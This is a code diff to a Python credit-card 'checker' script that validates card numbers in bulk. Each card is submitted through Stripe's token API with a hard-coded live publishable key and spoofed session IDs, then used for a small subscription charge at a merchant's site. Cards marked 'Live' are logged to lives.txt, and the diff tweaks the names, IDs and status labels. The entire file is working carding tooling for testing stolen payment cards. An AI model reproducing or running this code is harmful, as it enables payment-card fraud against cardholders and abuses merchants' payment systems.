@@ -13,7 +13,7 @@ def randomString2(stringLength=8):
     letters= string.ascii_lowercase
     return ''.join(random.sample(letters,stringLength))
 
-def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson"):
+def StripeAutomate(credit_card, ccEntry, firstname="Samsoden", lastname="Smith"):
     ccEntry = str(ccEntry)
     ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
     api_token = "https://api.stripe.com/v1/tokens"
@@ -31,9 +31,9 @@ def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson")
 
     stripe_data = {
         'time_on_page': random.randint(55382, 68020),
-        'guid': 'e8c975ed-c2e1-4cfb-ac82-1fb96d4ad03f',
-        'muid': '76fa122a-d9cf-44d8-b9ab-4e09c50bf66a',
-        'sid': '34618fcb-8540-419c-8d6b-dd16d55c2ed6',
+        'guid': '01479b8a-8652-44e0-b958-d5bf011c5831',
+        'muid': '8fe97add-dd14-48e9-a2f7-54369ed0fcd2',
+        'sid': '1969f315-6fa1-4921-beda-125504e824e2',
         'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
         'payment_user_agent': 'stripe.js/303cf2d',
         'card[number]': ccNum,
@@ -47,7 +47,7 @@ def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson")
     try:
         token = stripe_response['id']
     except Exception:
-        print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' / FRAUD DETECT!')
+        print("[" + ccEntry + "] Dead\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' /Blacklisted Bin')
         return
 
     result_data = {
@@ -60,7 +60,7 @@ def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson")
         'amount': '1599',
         'email': 'none@none.com',
         'stripe_plan': 'STDmonthly199',
-        'stripeToken': token,
+        'stripeToken': 'tok_1ErJDpHSRJEHtpzdJ5nnRsET',
         'stripe_plan': 'STDmonthly199',
         'amount': '1.99',
         'planid': 'STD',
@@ -71,19 +71,17 @@ def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson")
     try:
         res = BeautifulSoup(result, 'html.parser').findAll('font', {'color': 'red'})[1].get_text()
         if 'code' in res.lower():
-            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
+            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "Live\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
             with open("lives.txt", "a") as filelive:
                 filelive.write(credit_card + " - Invalid CVV")
                 filelive.close()
-            return("LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
+            return("Live\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
         else:
-            print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
-            return('DEAD\t----\t' + credit_card + " => " + res.replace("\n", ""))
+            print("[" + ccEntry + "] Dead\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
+            return('Dead\t----\t' + credit_card + " => " + res.replace("\n", ""))
     except Exception as e:
-        print("LIVE\t----\t" + credit_card)
+        print("Live\t----\t" + credit_card)
         with open("lives.txt", "a") as livefile:
             livefile.write(credit_card + " - Valid CVV")
             livefile.close()
-        return("LIVE\t----\t" + credit_card)
-
-
+        return("Live\t----\t" + credit_card)
